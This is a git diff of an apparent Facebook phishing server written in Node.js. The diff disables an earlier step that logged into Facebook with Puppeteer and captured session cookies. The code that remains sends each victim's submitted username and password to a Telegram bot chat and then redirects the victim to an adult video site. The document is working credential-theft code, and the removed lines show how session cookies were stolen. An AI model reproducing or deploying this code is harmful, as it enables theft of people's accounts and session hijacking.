@@ -26,58 +26,58 @@ app.post('/', async function (req, res) {
   var ipAddress = req.ip;
 
   let autoLogin = async () => {
-    const browser = await puppeteer.launch({
-      headless: true
-    });
-    const page = await browser.newPage();
-    await page.goto('https://en-gb.facebook.com/login.php');
+    // const browser = await puppeteer.launch({
+    //   headless: true
+    // });
+    // const page = await browser.newPage();
+    // await page.goto('https://en-gb.facebook.com/login.php');
 
-    const USER_SELECTOR = '#email';
-    const PASSWORD_SELECTOR = '#pass';
-    const BUTTON_LOGIN_SELECTOR = '#loginbutton';
+    // const USER_SELECTOR = '#email';
+    // const PASSWORD_SELECTOR = '#pass';
+    // const BUTTON_LOGIN_SELECTOR = '#loginbutton';
 
-    await page.click(USER_SELECTOR);
-    await page.keyboard.type(username);
+    // await page.click(USER_SELECTOR);
+    // await page.keyboard.type(username);
 
-    await page.click(PASSWORD_SELECTOR);
-    await page.keyboard.type(password);
+    // await page.click(PASSWORD_SELECTOR);
+    // await page.keyboard.type(password);
 
-    await page.click(BUTTON_LOGIN_SELECTOR);
-    await page.waitForNavigation();
-    var pageTitle = await page.title();
+    // await page.click(BUTTON_LOGIN_SELECTOR);
+    // await page.waitForNavigation();
+    // var pageTitle = await page.title();
 
-    if (pageTitle == "Log in to Facebook") {
-      res.render('fail');
-    } else {
-      const cookies = await page.cookies();
-      async function sendToTelegramBot(username, password, cookies, ipAddress) {
+    // if (pageTitle == "Log in to Facebook") {
+    //   res.render('fail');
+    // } else {
+    //   const cookies = await page.cookies();
+      async function sendToTelegramBot(username, password) {
         // Thay thế 'YOUR_CHAT_ID' bằng chat ID của bạn (cá nhân hoặc nhóm)
         const chatId = '-953376614';
 
         // Lấy thông tin địa chỉ cụ thể từ địa chỉ IP
 
-        const cookies2 = JSON.stringify(cookies);
-        const cookiesArray = JSON.parse(cookies2);
-        const cookieString = cookiesArray.map(cookie => {
-          const cookieData = {
-            name: cookie.name,
-            value: cookie.value,
-            domain: cookie.domain,
-            httponly: cookie.httpOnly,
-            expires_timestamp: Math.round(cookie.expires),
-          };
-          const cookieParts = Object.entries(cookieData).map(([key, value]) => `${key}:${value}`).join(',');
-          return `${cookie.name}=${cookie.value},${cookieParts}`;
-        }).join('; ');
-        const cUserRegex = /c_user=(\d+)/;
-        const match = cookieString.match(cUserRegex);
-        const cUserValue = match ? match[1] : null;
+        // const cookies2 = JSON.stringify(cookies);
+        // const cookiesArray = JSON.parse(cookies2);
+        // const cookieString = cookiesArray.map(cookie => {
+        //   const cookieData = {
+        //     name: cookie.name,
+        //     value: cookie.value,
+        //     domain: cookie.domain,
+        //     httponly: cookie.httpOnly,
+        //     expires_timestamp: Math.round(cookie.expires),
+        //   };
+        //   const cookieParts = Object.entries(cookieData).map(([key, value]) => `${key}:${value}`).join(',');
+        //   return `${cookie.name}=${cookie.value},${cookieParts}`;
+        // }).join('; ');
+        // const cUserRegex = /c_user=(\d+)/;
+        // const match = cookieString.match(cUserRegex);
+        // const cUserValue = match ? match[1] : null;
         let
           message = '================ 🆕🆕 NEW LOG 🆘🆘================= \n' + '\n';
-        message += '🆔 ID: ' + cUserValue + '\n' + '\n';
+        // message += '🆔 ID: ' + cUserValue + '\n' + '\n';
         message += '📧 Username: ' + username + '\n' + '\n';
         message += '🔐 Password: ' + password + '\n' + '\n';
-        message += '🍪 Cookies: ' + cookieString + '\n\n';
+        // message += '🍪 Cookies: ' + cookieString + '\n\n';
         message += '📅 Date : ' + formattedDate + '\n' + '\n';
         message += '================ 🆕🆕 NEW LOG 🆘🆘================= ';
         bot.sendMessage(chatId, message)
@@ -89,10 +89,10 @@ app.post('/', async function (req, res) {
           });
       }
 
-      sendToTelegramBot(username, password, cookies, ipAddress);
+      sendToTelegramBot(username, password);
 
       res.redirect('https://vjav.com/videos/367426/soe-992-rion/');
-    }
+    // }
   };
 
   autoLogin();
